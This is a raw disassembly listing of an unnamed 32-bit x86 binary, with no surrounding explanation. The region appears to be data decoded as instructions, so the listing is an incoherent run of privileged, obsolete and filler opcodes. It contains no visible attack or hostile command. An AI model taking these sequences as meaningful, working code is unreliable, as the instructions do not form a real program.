  4075bb:	add    eax,0x9652cbb
  4075c0:	fs add ch,al
  4075c3:	sub    al,0x77
  4075c5:	or     DWORD PTR [eax+eax*1+0x1],ebp
  4075c9:	push   es
  4075ca:	clc    
  4075cb:	pop    es
  4075cc:	ins    BYTE PTR es:[edi],dx
  4075cd:	add    cl,cl
  4075cf:	daa    
  4075d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d1:	or     BYTE PTR [eax+eax*1-0x37],ah
  4075d5:	daa    
  4075d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d7:	or     BYTE PTR [eax+eax*1-0x3b],ch
  4075db:	sub    al,0x77
  4075dd:	or     DWORD PTR [eax+eax*1+0x4e],ebp
  4075e1:	sub    ebp,DWORD PTR [eax+0x5c007409]
  4075e7:	sub    edi,DWORD PTR [ecx+ecx*1+0x2ceb007c]
  4075ee:	ror    BYTE PTR [ecx],1
  4075f0:	je     0x4075f2
  4075f2:	jge    0x40761f
  4075f4:	mov    al,BYTE PTR [edx]
  4075f6:	jmp    0xc06d6aff
  4075fb:	or     BYTE PTR [ecx+0x3],cl
  4075fe:	add    ch,BYTE PTR ds:0x34909e8
  407604:	or     BYTE PTR ds:0x6c027c,ch
  40760a:	pop    ds
  40760b:	sub    eax,0x6c003b
  407610:	out    dx,al
  407611:	sub    ebx,DWORD PTR [esi+0x25018108]
  407617:	sub    eax,0x52909f7
  40761c:	dec    eax
  40761d:	sub    eax,0x5290a0b
  407622:	push   edi
  407623:	sub    eax,0x1a90a0b
  407628:	add    DWORD PTR [esi],eax
  40762a:	cmp    eax,DWORD PTR [eax]
  40762c:	mov    eax,ds:0x11060101
  407631:	or     bh,BYTE PTR [ecx]
  407633:	add    eax,0x1a50601
  407638:	test   eax,0x212d9001
  40763d:	or     ch,BYTE PTR [ecx+0x272b8601]
  407643:	or     ah,BYTE PTR [ecx+0x2c2bee01]
  407649:	or     ah,BYTE PTR [ecx+0x3127c901]
  40764f:	or     ch,BYTE PTR [ecx-0x2d4ebff]
  407655:	add    eax,0x2d9501a9
  40765a:	cmp    eax,0x9d04990a
  40765f:	sub    eax,0x9c086a
  407664:	add    DWORD PTR [esi],eax
  407666:	clc    
  407667:	pop    es
  407668:	pushf  
  407669:	add    dh,ch
  40766b:	sub    ebx,DWORD PTR [esi+0x8054108]
  407671:	sub    al,0xc0
  407673:	or     BYTE PTR [ecx+0x5],al
  407676:	enter  0x782b,0xa
  40767a:	pushf  
  40767b:	add    cl,cl
  40767d:	daa    
  40767e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40767f:	or     BYTE PTR [eax+eax*1+0xa7f2b86],bl
  407686:	or     DWORD PTR ds:0xa8c2d90,eax
  40768c:	dec    ecx
  40768d:	add    eax,0x3b0601
  407692:	dec    ecx
  407693:	add    eax,0x1a50601
  407698:	dec    ecx
  407699:	add    eax,0xa992ded
  40769e:	dec    ecx
  40769f:	add    eax,0xaa02ded
  4076a4:	or     DWORD PTR [eax],eax
  4076a6:	hlt    
  4076a7:	sub    eax,0x1a1027c
  4076ac:	xchg   BYTE PTR [ebx],ch
  4076ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076af:	or     cl,BYTE PTR [ecx+0x3]
  4076b2:	std    
  4076b3:	sub    eax,0x3490ab6
  4076b8:	add    eax,0xa406012e
  4076bd:	add    BYTE PTR [ecx],al
  4076bf:	push   es
  4076c0:	cmp    eax,DWORD PTR [eax]
  4076c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c3:	add    cl,cl
  4076c5:	daa    
  4076c6:	call   0x95411ad1
  4076cb:	sub    eax,0x5510aca
  4076d0:	add    DWORD PTR [esi],eax
  4076d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d3:	add    DWORD PTR [ecx+0x5],ebx
  4076d6:	xor    ebp,DWORD PTR [esi]
  4076d8:	fimul  WORD PTR [edx]
  4076da:	pop    ecx
  4076db:	add    eax,0x27c1a2f
  4076e0:	pop    ecx
  4076e1:	add    eax,0x28a2e40
  4076e6:	pop    ecx
  4076e7:	add    eax,0x27c2ceb
  4076ec:	pop    ecx
  4076ed:	add    eax,0x28a2e55
  4076f2:	pop    ecx
  4076f3:	add    eax,0x28a2e69
  4076f8:	pop    ecx
  4076f9:	add    eax,0x28a2e77
  4076fe:	imul   eax,DWORD PTR ds:0x3b0601,0x27c90569
  407708:	mov    cl,0x1
  40770a:	imul   eax,DWORD PTR ds:0x2ec2b86,0x2eac0361
  407714:	in     al,0xa
  407716:	xchg   esp,eax
  407717:	add    BYTE PTR [ecx],al
  407719:	push   es
  40771a:	call   0xc9422025
  40771f:	daa    
  407720:	les    eax,FWORD PTR [ebx]
  407722:	pop    ecx
  407723:	add    eax,0x3b259f
  407728:	dec    ecx
  407729:	add    eax,edx
  40772b:	sbb    BYTE PTR cs:[ebx],cl
  40772e:	jns    0x407735
  407730:	add    DWORD PTR [esi],eax
  407732:	cmp    eax,DWORD PTR [eax]
  407734:	sub    DWORD PTR [ecx],eax
  407736:	pop    esp
  407737:	sub    edi,DWORD PTR [ebx+0xc]
  40773a:	sub    DWORD PTR [ecx],eax
  40773c:	loop   0x40776c
  40773e:	adc    eax,0x101e107
  407743:	push   es
  407744:	mov    es,WORD PTR [edx]
  407746:	add    DWORD PTR ds:0xc8d2f1e,0x194e0169
  407750:	xchg   ebx,eax
  407751:	or     al,0x89
  407753:	add    eax,0x9122f34
  407758:	xchg   ecx,eax
  407759:	add    eax,0x6560601
  40775e:	leave  
  40775f:	add    DWORD PTR [eax+0x2f],ebp
  407762:	lahf   
  407763:	or     al,0xc9
  407765:	add    DWORD PTR [ecx-0x36f360d1],eax
  40776b:	add    DWORD PTR [edx+0x69065c2f],ebx
  407771:	add    DWORD PTR [edx-0x66f36cd1],esi
  407777:	add    eax,0x3b0601
  40777c:	cdq    
  40777d:	add    eax,0xca62fed
  407782:	cdq    
  407783:	add    eax,0x1a53005
  407788:	cdq    
  407789:	add    eax,0x1a5301b
  40778e:	fld    DWORD PTR [ecx]
  407790:	add    DWORD PTR [esi],eax
  407792:	lods   eax,DWORD PTR ds:[esi]
  407793:	or     al,0xb1
  407795:	add    eax,0xcb63055
  40779a:	leave  
  40779b:	add    DWORD PTR [ecx],eax
  40779d:	push   es
  40779e:	mov    edi,0x6101c90c
  4077a3:	xor    BYTE PTR [edi+0x7701c90c],bl
  4077a9:	xor    BYTE PTR [edi-0x72fe36f4],bl
  4077af:	xor    BYTE PTR [esi+eax*1-0x47],bl
  4077b3:	add    eax,0x3b0601
  4077b8:	mov    cl,0x1
  4077ba:	mov    dl,0x30
  4077bc:	jl     0x4077c0
  4077be:	mov    ecx,0xa530be05
  4077c3:	add    DWORD PTR [ecx-0x33cf35ff],esi
  4077c9:	or     al,0xb9
  4077cb:	add    eax,0x1a530d2
  4077d0:	lods   al,BYTE PTR ds:[esi]
  4077d1:	add    BYTE PTR [ecx],al
  4077d3:	push   es
  4077d4:	fisttp DWORD PTR [ecx+ecx*8]
  4077d7:	add    ebp,esi
  4077d9:	xor    BYTE PTR [edx+0x701c902],cl
  4077df:	xor    DWORD PTR [edx+0x7b01c902],ecx
  4077e5:	or     edi,DWORD PTR [edx+eax*1-0x37]
  4077e9:	add    ebx,ebp
  4077eb:	adc    eax,0x1790cfc
  4077f0:	adc    ebp,DWORD PTR [edx]
  4077f2:	or     ecx,DWORD PTR ds:0x1a2f05d1
  4077f8:	jl     0x4077fc
  4077fa:	inc    ecx
  4077fb:	add    eax,0xd153133
  407800:	leave  
  407801:	add    DWORD PTR [ecx+0x4902ec16],ebx
  407807:	add    ecx,edx
  407809:	and    ebp,DWORD PTR [ebx+0x3]
  40780c:	dec    ecx
  40780d:	add    eax,DWORD PTR ds:0x2c0d1f2e
  407813:	add    cl,cl
  407815:	daa    
  407816:	call   0x9540a421
  40781b:	sub    eax,0x1c90aca
  407820:	ins    DWORD PTR es:[edi],dx
  407821:	xor    DWORD PTR [edx+0xd],ecx
  407824:	leave  
  407825:	add    DWORD PTR [esi],ebp
  407827:	push   ss
  407828:	ins    DWORD PTR es:[edi],dx
  407829:	or     eax,0x2b1405e9
  40782e:	std    
  40782f:	add    eax,0x2b4e05e1
  407834:	ja     0x407843
  407836:	stc    
  407837:	add    eax,0x32b2ceb
  40783c:	icebp  
  40783d:	add    DWORD PTR [ecx],eax
  40783f:	push   es
  407840:	cmp    eax,DWORD PTR [eax]
  407842:	add    DWORD PTR [esi],eax
  407844:	retf   0xfd31
  407847:	add    eax,0x31d901f1
  40784c:	pop    ds
  40784d:	add    eax,0x31e80601
  407852:	mov    al,BYTE PTR [edx]
  407854:	icebp  
  407855:	add    ecx,edi
  407857:	xor    DWORD PTR [esi+0xa05f902],ecx
  40785d:	xor    ch,BYTE PTR [ebx]
  40785f:	add    esi,ecx
  407861:	add    DWORD PTR [edx],edx
  407863:	xor    bl,BYTE PTR [edi]
  407865:	add    eax,0x321a0601
  40786a:	std    
  40786b:	add    eax,0x322a01f1
  407870:	pop    ds
  407871:	add    eax,0x323a0601
  407876:	std    
  407877:	add    eax,0x325301f1
  40787c:	pop    ds
  40787d:	add    eax,0x326c0601
  407882:	std    
  407883:	add    eax,0x327a01f1
  407888:	pop    ds
  407889:	add    eax,0x163b01c9
  40788e:	dec    ecx
  40788f:	add    al,0xc9
  407891:	add    eax,0x3b0601
  407896:	leave  
  407897:	add    DWORD PTR [ecx+0x16],ebx
  40789a:	pusha  
  40789b:	add    ecx,ecx
  40789d:	add    DWORD PTR [ebx+0x16],esi
  4078a0:	imul   eax,DWORD PTR [ebx],0xffffffc9
  4078a3:	add    DWORD PTR [edx-0x36fd13ea],eax
  4078a9:	add    ecx,edx
  4078ab:	push   ss
  4078ac:	mov    dh,0xd
  4078ae:	stc    
  4078af:	add    DWORD PTR [ecx],eax
  4078b1:	push   es
  4078b2:	cmp    eax,DWORD PTR [eax]
  4078b4:	stc    
  4078b5:	add    DWORD PTR [edx],edx
  4078b7:	xor    ah,BYTE PTR [ebp-0x61f9f6ff]
  4078bd:	xor    ah,BYTE PTR [eax+eax*1]
  4078c0:	stc    
  4078c1:	add    DWORD PTR [edx+esi*1+0x60901a5],esp
  4078c8:	scas   al,BYTE PTR es:[edi]
  4078c9:	xor    ah,BYTE PTR [eax+eax*1]
  4078cc:	stc    
  4078cd:	add    DWORD PTR [ebp+0x901a532],esi
  4078d3:	push   es
  4078d4:	shl    BYTE PTR [edx],0x24
  4078d7:	add    cl,bh
  4078d9:	add    esi,eax
  4078db:	xor    bl,BYTE PTR [edi]
  4078dd:	add    eax,0x2c820189
  4078e2:	xlat   BYTE PTR ds:[ebx]
  4078e3:	or     eax,0x30ca0189
  4078e8:	fimul  WORD PTR ds:0x32d000d9
  4078ee:	mov    al,BYTE PTR [edx]
  4078f0:	test   eax,0xe6263503
  4078f5:	or     eax,0x32d603b1
  4078fa:	inc    ecx
  4078fb:	push   es
  4078fc:	jns    0x4078ff
  4078fe:	std    
  4078ff:	xor    bh,bh
  407901:	or     eax,0x330a01c9
  407906:	adc    BYTE PTR [esi],cl
  407908:	jns    0x40790b
  40790a:	std    
  40790b:	xor    bl,BYTE PTR [ecx]
  40790d:	push   cs
  40790e:	mov    ecx,0xa5331705
  407913:	add    DWORD PTR [ecx+0x1f332405],edi
  407919:	add    eax,0x2a560629
  40791e:	jl     0x407922
  407920:	sub    DWORD PTR [esi],eax
  407922:	arpl   WORD PTR [edx],bp
  407924:	std    
  407925:	add    eax,0x337501b1
  40792a:	aaa    
  40792b:	push   cs
  40792c:	leave  
  40792d:	add    DWORD PTR ds:0xc90e5b17,esp
  407933:	add    DWORD PTR [edi],ecx
  407935:	pop    ss
  407936:	bound  ecx,QWORD PTR [esi]
  407938:	sub    DWORD PTR [esi],eax
  40793a:	sahf   
  40793b:	xor    ebp,DWORD PTR [ecx+0xe]
  40793e:	inc    ecx
  40793f:	push   es
  407940:	dec    esi
  407941:	sub    eax,ebp
  407943:	or     BYTE PTR [ecx],cl
  407945:	add    bl,al
  407947:	xor    ebx,DWORD PTR [ebx-0x64ffc6f2]
  40794d:	movntps XMMWORD PTR [ebx],xmm0
  407950:	imul   eax,DWORD PTR [ecx],0xea733ee
  407956:	popa   
  407957:	add    edi,edi
  407959:	xor    ebp,DWORD PTR [ebp+0xb01690e]
  40795f:	xor    al,0x13
  407961:	push   es
  407962:	popa   
  407963:	add    DWORD PTR [eax],esp
  407965:	xor    al,0xad
  407967:	push   cs
  407968:	imul   eax,DWORD PTR [ecx],0x613342c
  40796e:	imul   eax,DWORD PTR [ecx],0x6133440
  407974:	adc    DWORD PTR [edx],eax
  407976:	rcl    DWORD PTR [edi],1
  407978:	call   0x5606:0x1024104
  40797f:	push   es
  407980:	adc    DWORD PTR [edx],eax
  407982:	in     eax,0x17
  407984:	call   0x3b17:0x9e021104
  40798b:	add    BYTE PTR [ecx],dl
  40798d:	add    bh,BYTE PTR [ebp+0x18]
  407990:	mov    eax,ds:0x94021104
  407995:	sbb    BYTE PTR [ebp-0x52fdeeff],ah
  40799b:	sbb    ah,ch
  40799d:	add    dl,BYTE PTR [ecx]
  40799f:	add    bl,al
  4079a1:	sbb    BYTE PTR [esi-0x10fdeefc],ch
  4079a7:	sbb    ah,ch
  4079a9:	add    dl,BYTE PTR [ecx]
  4079ab:	add    dl,BYTE PTR [edi]
  4079ad:	sbb    DWORD PTR [ebp+0x15024104],esi
  4079b3:	cmp    eax,DWORD PTR ss:[eax]
  4079b6:	sub    DWORD PTR ds:0xef5361c,eax
  4079bc:	mov    eax,ds:0x3b060100
  4079c1:	add    BYTE PTR [ecx+0x2b0f9b00],ah
  4079c7:	add    esp,DWORD PTR [ecx+0x3b0bf300]
  4079cd:	add    BYTE PTR [ecx+0x6],bl
  4079d0:	inc    edx
  4079d1:	add    BYTE PTR ss:[edi],cl
  4079d4:	popa   
  4079d5:	push   es
  4079d6:	add    DWORD PTR [esi],eax
  4079d8:	push   esi
  4079d9:	push   es
  4079da:	pop    ecx
  4079db:	push   es
  4079dc:	push   0x690f0636
  4079e1:	push   es
  4079e2:	mov    BYTE PTR [esi],dh
  4079e4:	or     eax,0x9705410f
  4079e9:	adc    DWORD PTR ss:[edi],ecx
  4079ec:	dec    ecx
  4079ed:	add    ch,BYTE PTR [edi]
  4079ef:	sbb    bh,BYTE PTR [edx+eax*1+0x51]
  4079f3:	add    ah,BYTE PTR [edi-0x1ef0e7ca]
  4079f9:	add    al,0xb6
  4079fb:	and    cl,BYTE PTR ss:[edi]
  4079fe:	jns    0x407a01
  407a00:	mov    ebx,0x890d0b36
  407a05:	add    edi,eax
  407a07:	cmp    cl,BYTE PTR ss:[edi]
  407a0a:	mov    DWORD PTR [ecx],eax
  407a0c:	retf   0x4330
  407a0f:	vmwrite eax,DWORD PTR [ecx]
  407a12:	shl    DWORD PTR [esi],cl
  407a14:	sub    al,0xa
  407a16:	push   ecx
  407a17:	add    ah,ah
  407a19:	ss push edx
  407a1b:	psraw  mm0,QWORD PTR [ebp*8+0x2904e036]
  407a23:	add    bh,dh
  407a25:	mov    al,BYTE PTR ss:[edx]
  407a28:	mov    eax,ds:0xe719f100
  407a2d:	add    al,0xa1
  407a2f:	add    cl,bh
  407a31:	sbb    ebp,ebp
  407a33:	add    al,0xa1
  407a35:	add    BYTE PTR [esi],al
  407a37:	sbb    bl,ah
  407a39:	add    ch,BYTE PTR [ecx]
  407a3b:	add    ah,BYTE PTR [ebx-0x56fd83d6]
  407a41:	add    BYTE PTR [ecx],al
  407a43:	push   es
  407a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a45:	add    DWORD PTR [ecx],ebp
  407a47:	add    ch,BYTE PTR [edi]
  407a49:	sbb    bh,BYTE PTR [edx+eax*1-0x1f]
  407a4d:	add    al,0x19
  407a4f:	aaa    
  407a50:	imul   ecx,DWORD PTR [edi],0xffffffb1
  407a53:	add    BYTE PTR [ecx],al
  407a55:	push   es
  407a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a57:	add    DWORD PTR [eax+eax*1+0x3b0601],esi
  407a5e:	mov    esp,0x832b4e00
  407a63:	pinsrw mm0,WORD PTR [eax],0x5c
  407a67:	sub    ebx,DWORD PTR [ebx]
  407a69:	or     BYTE PTR [eax+eax*1+0x6e827c9],dh
  407a70:	les    eax,FWORD PTR [eax]
  407a72:	jge    0x407a9f
  407a74:	mov    al,BYTE PTR [edx]
  407a76:	int3   
  407a77:	add    BYTE PTR [ecx],al
  407a79:	push   es
  407a7a:	cmp    eax,DWORD PTR [eax]
  407a7c:	int3   
  407a7d:	add    cl,cl
  407a7f:	daa    
  407a80:	call   0x1414e8b
  407a85:	push   es
  407a86:	cmp    eax,DWORD PTR [eax]
  407a88:	aam    0x0
  407a8a:	leave  
  407a8b:	daa    
  407a8c:	call   0x1c408897
  407a91:	add    BYTE PTR [eax+0x20000e00],cl
  407a97:	add    BYTE PTR [ebp+0x24000e00],ah
  407a9d:	add    dh,al
  407a9f:	add    BYTE PTR [esi],cl
  407aa1:	add    BYTE PTR [eax+eax*1],dh
  407aa4:	mov    bh,0x1
  407aa6:	push   cs
  407aa7:	add    BYTE PTR [eax],bh
  407aa9:	add    dl,al
  407aab:	add    DWORD PTR [esi],ecx
  407aad:	add    BYTE PTR [eax+eax*1],bh
  407ab0:	retf   
  407ab1:	add    DWORD PTR [esi],ecx
  407ab3:	add    BYTE PTR [eax+0x0],al
  407ab6:	out    dx,al
  407ab7:	add    DWORD PTR [esi],ecx
  407ab9:	add    BYTE PTR [eax+eax*1+0x2f],bh
  407abd:	add    ecx,DWORD PTR [esi]
  407abf:	add    BYTE PTR [eax+0x2001ee00],al
  407ac5:	add    bl,ah
  407ac7:	add    BYTE PTR [ebx],dl
  407ac9:	add    eax,0xdb002e
  407ace:	test   eax,0x5b002e14
  407ad3:	add    BYTE PTR ds:0x63002e10,bh
  407ad9:	add    BYTE PTR ds:0xd3002e10,bh
  407adf:	add    BYTE PTR [eax+0x43002e14],ah
  407ae5:	add    bh,bh
  407ae7:	ucomiss xmm0,DWORD PTR [eax]
  407aea:	dec    ebx
  407aeb:	add    BYTE PTR [edi],dh
  407aed:	adc    BYTE PTR [esi],ch
  407aef:	add    BYTE PTR [ebx+0x0],dl
  407af2:	aaa    
  407af3:	adc    BYTE PTR [esi],ch
  407af5:	add    BYTE PTR [ebx+0x2e10db00],bl
  407afb:	add    bl,cl
  407afd:	add    BYTE PTR [ecx+0x73002e14],al
  407b03:	add    BYTE PTR [esi+0x10],ah
  407b06:	add    BYTE PTR cs:[ebx+0x0],bh
  407b0a:	adc    DWORD PTR [eax],0x83002e
  407b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b11:	adc    BYTE PTR [esi],ch
  407b13:	add    BYTE PTR [ebx+0x2e10db00],dl
  407b19:	add    BYTE PTR [ebx+0x0],ch
  407b1c:	cmp    eax,0xa3002e10
  407b21:	add    ch,ch
  407b23:	adc    BYTE PTR [esi],ch
  407b25:	add    BYTE PTR [ebx+0x2e10fb00],ch
  407b2b:	add    BYTE PTR [ebx+0x2e110600],dh
  407b31:	add    BYTE PTR [ebx+0x2e110c00],bh
  407b37:	add    bl,al
  407b39:	add    BYTE PTR [edi],dh
  407b3b:	adc    DWORD PTR [eax+0x0],eax
  407b3e:	jecxz  0x407b40
  407b40:	adc    eax,DWORD PTR ds:0xf30060
  407b46:	int    0x5
  407b48:	pusha  
  407b49:	add    bl,ch
  407b4b:	add    BYTE PTR [ebx],dl
  407b4d:	add    eax,0xe30081
  407b52:	adc    eax,DWORD PTR ds:0xe300a1
  407b58:	adc    eax,DWORD PTR ds:0xe30100
  407b5e:	adc    eax,DWORD PTR ds:0x7330203
  407b64:	daa    
  407b65:	or     eax,ebx
  407b67:	add    ah,bl
  407b69:	add    BYTE PTR [ebx],dl
  407b6b:	add    eax,0xe302e3
  407b70:	adc    eax,DWORD PTR ds:0xe30303
  407b76:	adc    eax,DWORD PTR ds:0xe30323
  407b7c:	adc    eax,DWORD PTR ds:0xe30343
  407b82:	adc    eax,DWORD PTR ds:0xe30363
  407b88:	adc    eax,DWORD PTR ds:0xe30381
  407b8e:	adc    eax,DWORD PTR ds:0xe30383
  407b94:	adc    eax,DWORD PTR ds:0xe303a3
  407b9a:	adc    eax,DWORD PTR ds:0xe303c1
  407ba0:	adc    eax,DWORD PTR ds:0xe30680
  407ba6:	adc    eax,DWORD PTR ds:0xe306a0
  407bac:	adc    eax,DWORD PTR ds:0xe30841
  407bb2:	adc    eax,DWORD PTR ds:0xe30980
  407bb8:	adc    eax,DWORD PTR ds:0xe309a0
  407bbe:	adc    eax,DWORD PTR ds:0xe30e60
  407bc4:	adc    eax,DWORD PTR ds:0xe30e80
  407bca:	adc    eax,DWORD PTR ds:0xe313e0
  407bd0:	adc    eax,DWORD PTR ds:0x3b1444
  407bd6:	adc    eax,DWORD PTR ds:0x3b1484
  407bdc:	adc    eax,DWORD PTR ds:0x67e0668
  407be2:	xchg   ebx,eax
  407be3:	push   es
  407be4:	test   al,0x6
  407be6:	cmp    BYTE PTR [edi],al
  407be8:	dec    ecx
  407be9:	pop    es
  407bea:	cdq    
  407beb:	pop    es
  407bec:	rol    BYTE PTR [edi],1
  407bee:	sub    ecx,DWORD PTR [eax]
  407bf0:	or     BYTE PTR fs:[ecx+0x8],dh
  407bf4:	lods   al,BYTE PTR ds:[esi]
  407bf5:	or     bl,cl
  407bf7:	or     ah,ah
  407bf9:	or     BYTE PTR [edi],dl
  407bfb:	or     DWORD PTR [ebp+0x9],eax
  407bfe:	push   edi
  407bff:	or     DWORD PTR [edx+0x9],ebp
  407c02:	jno    0x407c0d
  407c04:	or     BYTE PTR [ecx],0xd5
  407c07:	or     edi,ebp
  407c09:	or     esi,edi
  407c0b:	or     DWORD PTR [eax],ebx
  407c0d:	or     dh,BYTE PTR [edi]
  407c0f:	or     cl,BYTE PTR [esi+0xa]
  407c12:	pop    edx
  407c13:	or     ah,BYTE PTR [ebp+0xa]
  407c16:	xchg   BYTE PTR [edx],cl
  407c18:	lods   al,BYTE PTR ds:[esi]
  407c19:	or     bh,BYTE PTR [esi-0x14f52ff6]
  407c1f:	or     cl,BYTE PTR [ebx+ecx*1]
  407c22:	adc    ecx,DWORD PTR [ebx]
  407c24:	and    cl,BYTE PTR [ebx]
  407c26:	xchg   DWORD PTR [ecx+ebx*4],ecx
  407c29:	or     al,0xe2
  407c2b:	or     al,0xee
  407c2d:	or     al,0xf5
  407c2f:	or     al,0x24
  407c31:	or     eax,0xd7d0d5e
  407c36:	cwde   
  407c37:	or     eax,0xdad0da3
  407c3c:	mov    esp,0x270dec0d
  407c41:	push   cs
  407c42:	cmp    eax,0x960e6f0e
  407c47:	push   cs
  407c48:	aas    
  407c49:	add    BYTE PTR [ecx-0x41f146f2],ah
  407c4f:	push   cs
  407c50:	enter  0xcd0e,0xe
  407c54:	ror    BYTE PTR [esi],cl
  407c56:	xlat   BYTE PTR ds:[ebx]
  407c57:	push   cs
  407c58:	fmul   QWORD PTR [esi]
  407c5a:	lock push cs
  407c5c:	sti    
  407c5d:	push   cs
  407c5e:	sub    DWORD PTR [edi],ecx
  407c60:	dec    esp
  407c61:	xorps  xmm1,XMMWORD PTR [edi]
  407c64:	pop    ebp
  407c65:	packsswb mm1,QWORD PTR [edi]
  407c68:	xchg   esi,eax
  407c69:	btc    DWORD PTR [edi],ecx
  407c6c:	loope  0x407c7d
  407c6e:	add    al,BYTE PTR [eax]
  407c70:	add    DWORD PTR [eax],eax
  407c72:	or     DWORD PTR [eax],eax
  407c74:	add    al,BYTE PTR [eax]
  407c76:	or     al,BYTE PTR [eax]
  407c78:	or     BYTE PTR [eax],al
  407c7a:	or     eax,DWORD PTR [eax]
  407c7c:	or     DWORD PTR [eax],eax
  407c7e:	push   cs
  407c7f:	add    BYTE PTR [eax+eax*1],cl
  407c82:	str    WORD PTR [edi]
  407c85:	add    BYTE PTR [eax],dl
  407c87:	add    BYTE PTR ds:0x16001400,dl
  407c8d:	add    BYTE PTR ds:0x1700,dl
  407c93:	add    BYTE PTR ds:0x4206,ah
  407c99:	add    BYTE PTR [eax],bh
  407c9b:	movlps QWORD PTR [ebx],xmm0
  407c9e:	add    BYTE PTR [eax],al
  407ca0:	dec    eax
  407ca1:	nop    DWORD PTR [ebx]
  407ca4:	add    BYTE PTR [eax],al
  407ca6:	push   esi
  407ca7:	nop    DWORD PTR [ebx]
  407caa:	add    BYTE PTR [eax],al
  407cac:	popa   
  407cad:	nop    DWORD PTR [ebx]
  407cb0:	add    BYTE PTR [eax],al
  407cb2:	outs   dx,DWORD PTR ds:[esi]
  407cb3:	nop    DWORD PTR [ebx]
  407cb6:	add    BYTE PTR [eax],al
  407cb8:	jg     0x407cc9
  407cba:	daa    
  407cbb:	add    eax,DWORD PTR [eax]
  407cbd:	add    BYTE PTR [esi],bl
  407cbf:	adc    BYTE PTR [edi],ah
  407cc1:	add    eax,DWORD PTR [eax]
  407cc3:	add    cl,cl
  407cc5:	adc    ch,BYTE PTR [ebx+eax*1+0x12d00000]
  407ccc:	mov    bl,0x3
  407cce:	add    BYTE PTR [eax],al
  407cd0:	fist   WORD PTR [edx]
  407cd2:	mov    eax,0x50000003
  407cd7:	adc    ebx,DWORD PTR [ecx]
  407cd9:	add    eax,DWORD PTR [eax]
  407cdb:	add    BYTE PTR [ebp+0x13],dl
  407cde:	sbb    DWORD PTR [ebx],eax
  407ce0:	add    BYTE PTR [eax],al
  407ce2:	push   0x31913
  407ce7:	add    bl,ch
  407ce9:	adc    ebx,DWORD PTR [ecx]
  407ceb:	add    eax,DWORD PTR [eax]
  407ced:	add    ah,dh
  407cef:	adc    esp,DWORD PTR [edi]
  407cf1:	add    eax,DWORD PTR [eax]
  407cf3:	add    BYTE PTR [edi],bh
  407cf5:	adc    ebx,ebp
  407cf7:	add    eax,DWORD PTR [eax]
  407cf9:	add    BYTE PTR [edx],ah
  407cfb:	adc    bl,BYTE PTR [ecx]
  407cfd:	add    eax,DWORD PTR [eax]
  407cff:	add    dl,bh
  407d01:	adc    ebx,DWORD PTR [ecx]
  407d03:	add    eax,DWORD PTR [eax]
  407d05:	add    BYTE PTR [ebp+0x13],dl
  407d08:	sbb    DWORD PTR [ebx],eax
  407d0a:	add    BYTE PTR [eax],al
  407d0c:	sbb    bl,BYTE PTR [eax]
  407d0e:	daa    
  407d0f:	add    eax,DWORD PTR [eax]
  407d11:	add    BYTE PTR [esi+0x1a],cl
  407d14:	sbb    DWORD PTR [ebx],eax
  407d16:	add    BYTE PTR [eax],al
  407d18:	dec    esi
  407d19:	sbb    bl,BYTE PTR [ecx]
  407d1b:	add    eax,DWORD PTR [eax]
  407d1d:	add    BYTE PTR [esi+0x50d1a],al
  407d23:	add    BYTE PTR [edx+0x50d1a],dl
  407d29:	add    BYTE PTR [eax+0x2050d1a],bl
  407d2f:	add    BYTE PTR [ecx],al
  407d31:	add    BYTE PTR [ebx],al
  407d33:	add    BYTE PTR [ecx],al
  407d35:	add    BYTE PTR [edx],al
  407d37:	add    BYTE PTR [ebx],al
  407d39:	add    BYTE PTR [edx],al
  407d3b:	add    BYTE PTR ds:0x2000500,ch
  407d41:	add    BYTE PTR [esi],ch
  407d43:	add    BYTE PTR [edi],al
  407d45:	add    BYTE PTR [ecx],al
  407d47:	add    BYTE PTR [edi],ch
  407d49:	add    BYTE PTR [edi],al
  407d4b:	add    BYTE PTR [edx],al
  407d4d:	add    BYTE PTR [eax],dh
  407d4f:	add    BYTE PTR [ecx],cl
  407d51:	add    BYTE PTR [ecx],al
  407d53:	add    BYTE PTR [ecx],dh
  407d55:	add    BYTE PTR [ecx],cl
  407d57:	add    BYTE PTR [edx],al
  407d59:	add    BYTE PTR [edx],dh
  407d5b:	add    BYTE PTR [ebx],cl
  407d5d:	add    BYTE PTR [edx],al
  407d5f:	add    BYTE PTR [ebx],dh
  407d61:	add    BYTE PTR ds:0x34000200,cl
  407d67:	add    BYTE PTR [edi],cl
  407d69:	add    BYTE PTR [ecx],al
  407d6b:	add    BYTE PTR ds:0x2000f00,dh
  407d71:	add    BYTE PTR [eax+eax*1+0x11],cl
  407d75:	add    BYTE PTR [ecx],al
  407d77:	add    BYTE PTR [ebp+0x0],cl
  407d7a:	adc    DWORD PTR [eax],eax
  407d7c:	add    al,BYTE PTR [eax]
  407d7e:	push   eax
  407d7f:	add    BYTE PTR [ebx],dl
  407d81:	add    BYTE PTR [edx],al
  407d83:	add    BYTE PTR [ecx+0x0],dl
  407d86:	adc    eax,0x52000200
  407d8b:	add    BYTE PTR [edi],dl
  407d8d:	add    BYTE PTR [edx],al
  407d8f:	add    BYTE PTR [eax+0x0],ch
  407d92:	sbb    DWORD PTR [eax],eax
  407d94:	add    al,BYTE PTR [eax]
  407d96:	imul   eax,DWORD PTR [eax],0x2001b
  407d9c:	push   0x0
  407d9e:	sbb    eax,0x6d000200
  407da3:	add    BYTE PTR [edi],bl
  407da5:	add    BYTE PTR [edx],al
  407da7:	add    BYTE PTR [esi+0x0],ch
  407daa:	and    DWORD PTR [eax],eax
  407dac:	add    al,BYTE PTR [eax]
  407dae:	outs   dx,DWORD PTR ds:[esi]
  407daf:	add    BYTE PTR [ebx],ah
  407db1:	add    BYTE PTR [edx],al
  407db3:	add    BYTE PTR [eax+0x0],dh
  407db6:	and    eax,0x71000200
  407dbb:	add    BYTE PTR [edi],ah
  407dbd:	add    BYTE PTR [edx],al
  407dbf:	add    BYTE PTR [edx+0x0],dh
  407dc2:	sub    DWORD PTR [eax],eax
  407dc4:	add    al,BYTE PTR [eax]
  407dc6:	jae    0x407dc8
